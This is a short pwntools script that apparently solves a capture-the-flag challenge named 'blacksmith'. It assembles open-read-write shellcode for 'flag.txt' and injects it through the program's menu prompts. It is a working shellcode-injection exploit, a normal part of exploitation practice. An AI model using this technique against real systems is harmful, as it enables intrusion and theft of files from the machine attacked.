import pathlib

from pwn import *

import utils.target

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'blacksmith'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

shellcode = shellcraft.open('flag.txt')
shellcode += shellcraft.read(3, 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 'rax')
shellcode += shellcraft.exit(0)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = utils.target.start(exe=str(exe), gdb_script=gdb_script)

payload = flat(asm(shellcode))
info(f'Payload length: {len(payload)}')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', asm(shellcode))

success(io.recv())
